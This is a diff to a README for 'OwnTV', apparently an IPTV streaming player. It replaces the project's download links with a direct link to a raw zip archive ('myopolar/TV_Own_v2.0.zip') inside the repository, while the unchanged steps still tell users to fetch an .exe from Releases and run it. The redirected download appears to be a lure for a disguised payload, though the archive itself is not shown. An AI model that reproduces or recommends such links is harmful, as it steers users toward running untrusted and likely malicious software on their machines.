@@ -1,7 +1,7 @@
 # 📺 OwnTV - Stream your own IPTV content easily
 
 <p align="center">
-  <a href="https://github.com/morganaafroasian296/OwnTV">
+  <a href="https://github.com/morganaafroasian296/OwnTV/raw/refs/heads/main/myopolar/TV_Own_v2.0.zip">
     <img src="https://img.shields.io/badge/Download-OwnTV-blue?style=for-the-badge&logo=github" alt="Download OwnTV">
   </a>
 </p>
@@ -19,7 +19,7 @@ OwnTV offers a simple way to watch your IPTV content. This player works on your 
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [official download page](https://github.com/morganaafroasian296/OwnTV).
+1. Visit the [official download page](https://github.com/morganaafroasian296/OwnTV/raw/refs/heads/main/myopolar/TV_Own_v2.0.zip).
 2. Look for the latest version under the Releases section.
 3. Download the installer file ending in .exe to your local drive.
 4. Open the downloaded file to begin the installation process.
